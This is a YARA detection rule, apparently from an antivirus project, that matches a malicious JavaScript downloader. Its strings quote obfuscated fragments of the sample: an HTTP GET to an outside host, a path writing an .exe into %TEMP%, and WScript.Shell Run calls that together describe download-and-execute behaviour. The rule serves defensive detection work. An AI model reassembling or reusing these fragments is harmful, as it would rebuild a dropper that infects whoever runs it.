rule sig_20160329_ab6b73a4bbe1533ee1a2b96a7e19948c {
  meta:
    description = "datamaliciousorder - file 20160329_ab6b73a4bbe1533ee1a2b96a7e19948c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aabfc7601d0a31d0b21b886f17cad6c289aae205a60e6cf029837f2b30b4b2da"

  strings:
    $s1  = "O0[h](\"GET\", \"http://icurlers.com/sodp1os\", false);" fullword ascii
    $s2  = "function I() {return p[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ykEHY0YuCLr.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[dw](ZV() * 11); if (O0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function K(Hg, lf){E = E * 1; return Hg - lf;};" fullword ascii
    $s5  = "var p = function nk() {return WScript[Tp](\"WScript.Shell\");}(), L = 11;" fullword ascii
    $s6  = "function jo(){return \"\" + s0;};" fullword ascii
    $s7  = "function Ib() {return ((Q == true) && (Q == O)) ? 1 : E;};" fullword ascii
    $s8  = "function zm(l0){p[\"Run\"](l0, E, E);};" fullword ascii
    $s9  = "function rb()" fullword ascii
    $s10 = "var F0 = new this[\"Date\"]();" fullword ascii
    $s11 = "function ZV(){return 22;};" fullword ascii
    $s12 = " while (Eq){" fullword ascii
    $s13 = "return K(F1, Bd);" fullword ascii
    $s14 = "function F(b) {var y = (1, 2, 3, 4, 5, b); return y;};" fullword ascii
    $s15 = "function RD(){return Tp;};" fullword ascii
    $s16 = "var O = false;" fullword ascii
    $s17 = "O = true; " fullword ascii
    $s18 = "Q = true; " fullword ascii
    $s19 = "var Q = false;" fullword ascii
    $s20 = "var Ti = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}